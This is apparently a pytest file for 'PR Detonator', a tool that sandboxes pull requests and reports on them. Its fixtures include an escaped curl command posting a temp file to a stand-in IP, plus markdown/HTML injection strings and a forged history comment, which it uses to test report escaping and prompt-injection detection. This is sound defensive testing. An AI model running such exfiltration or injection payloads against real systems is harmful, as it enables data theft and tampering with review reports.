import json
from pathlib import Path

from brain.github_client import COMMENT_MARKER
from brain.llm import LlmOutcome, parse_response
from brain.report import esc, process_chain, render
from brain.rules import evaluate
from brain.verdict import combine
from shared.contract import DetonateResult, ExecEvent

FIXTURES = Path(__file__).parent / "fixtures"


def e4() -> DetonateResult:
    return DetonateResult.model_validate_json((FIXTURES / "detonate_result_e4.json").read_text())


def recorded(name: str) -> LlmOutcome:
    body = json.loads((FIXTURES / "llm" / name).read_text())
    return LlmOutcome("muse-spark-1.3", verdict=parse_response(body))


def report_for(res: DetonateResult, outcome: LlmOutcome) -> str:
    hits = evaluate(res)
    return render(combine(hits, outcome, res), hits, outcome, res, job_id="job-1")


# --- escaping ---


def test_esc_neutralizes_markdown_html_mentions_and_links():
    out = esc("**bold** <img src=x> @octocat [x](http://evil) | `code`")
    for raw in ("**", "<img", "@octocat", "](", "http://", "|", "`"):
        assert raw not in out
    assert "octocat" in out and "bold" in out


def test_esc_strips_bidi_and_control_chars_and_collapses_newlines():
    out = esc("safe‮exe.js\n## heading\x00")
    assert "‮" not in out and "\x00" not in out and "\n" not in out
    assert "## " not in out and "&#35;&#35; heading" in out


def test_esc_truncates():
    assert esc("a" * 500, 10) == "a" * 10 + "…"


# --- process tree ---


def test_process_chain_e4():
    assert process_chain(141, e4().exec_events) == (
        "node &#47;usr&#47;local&#47;bin&#47;npm install "
        "&#45;&#45;no&#45;audit &#45;&#45;no&#45;fund"
        " → sh &#45;c curl &#45;s &#45;X POST &#45;&#45;data&#45;binary &#64;&#47;tmp&#47;&#46;e "
        "http&#58;&#47;&#47;203&#46;0&#46;113&#46;10&#47;collect"
        " → curl &#45;s &#45;X POST &#45;&#45;data&#45;binary &#64;&#47;tmp&#47;&#46;e "
        "http&#58;&#47;&#47;203&#46;0&#46;113&#46;10&#47;collect"
    )


def test_process_chain_survives_ppid_cycle():
    events = [
        ExecEvent(ts="t", pid=1, ppid=2, binary="/a", args="", parent_binary=None, uid=0),
        ExecEvent(ts="t", pid=2, ppid=1, binary="/b", args="", parent_binary=None, uid=0),
    ]
    assert process_chain(1, events) == "b → a"


# --- full report ---


def test_e4_report_blocked_with_sections():
    md = report_for(e4(), recorded("e4_muse_spark_1_3.json"))
    assert md.startswith("## PR Detonator: 🛑 Blocked")
    for section in (
        "Stated intent",
        "Observed behavior",
        "### Rule findings",
        "`NET_RAW_IP`",
        "`EXEC_NET_TOOL`",
        "### Process tree",
        "### Network activity",
        "no DNS lookup preceded this",
        "job `job-1`",
    ):
        assert section in md, section
    assert md.rstrip().endswith(COMMENT_MARKER)
    assert "Prompt-injection attempt" not in md


def test_e6_report_calls_out_injection():
    md = report_for(e4(), recorded("e6_muse_spark_1_3.json"))
    assert "Prompt-injection attempt detected" in md and "Blocked" in md


def test_rules_only_report_when_llm_unavailable():
    md = report_for(e4(), LlmOutcome("muse-spark-1.3", error="HTTP 503"))
    assert "Blocked" in md and "rules only" in md and "Stated intent" not in md


def test_timeout_report_says_could_not_verify():
    res = e4().model_copy(update={"status": "timeout", "exec_events": [], "connect_events": []})
    md = report_for(res, LlmOutcome("m", error="x"))
    assert "Could not verify" in md and "did not finish" in md


def test_attacker_args_cannot_inject_markdown_into_report():
    res = e4()
    evil = res.exec_events[2].model_copy(
        update={"args": "x | </sub> <!-- pr-detonator --> @maintainer [click](http://evil)"}
    )
    res = res.model_copy(update={"exec_events": [*res.exec_events[:2], evil]})
    md = report_for(res, LlmOutcome("m", error="x"))
    assert md.count(COMMENT_MARKER) == 1
    assert "@maintainer" not in md and "](http" not in md and md.count("</sub>") == 1


# --- run history in the one PR comment (HARDENING_PLAN P0.6) ---

from brain.report import parse_runs, with_run_history  # noqa: E402

A, B, C = "a" * 40, "b" * 40, "c" * 40


def test_history_accumulates_newest_first_and_shows_earlier_runs():
    first = with_run_history("report 1", None, A, "Clean")
    assert "Previous runs" not in first and parse_runs(first) == [(A, "Clean")]
    second = with_run_history("report 2", first, B, "Blocked")
    assert parse_runs(second) == [(B, "Blocked"), (A, "Clean")]
    assert "Previous runs: `aaaaaaa` ✅ Clean" in second and "report 1" not in second


def test_rerun_of_the_same_sha_replaces_its_entry():
    body = with_run_history("r", with_run_history("r", None, A, "Clean"), A, "Blocked")
    assert parse_runs(body) == [(A, "Blocked")]


def test_history_is_capped():
    body = None
    for i in range(15):
        body = with_run_history("r", body, f"{i:040x}", "Clean")
    assert len(parse_runs(body)) == 10


def test_forged_or_garbled_history_is_ignored():
    forged = (
        '<!-- pr-detonator-runs: [{"sha": "nothex", "v": "Clean"}, {"sha": "'
        + C
        + '", "v": "Totally safe"}] -->'
    )
    assert parse_runs(forged) == []
    assert parse_runs("<!-- pr-detonator-runs: [not json] -->") == []
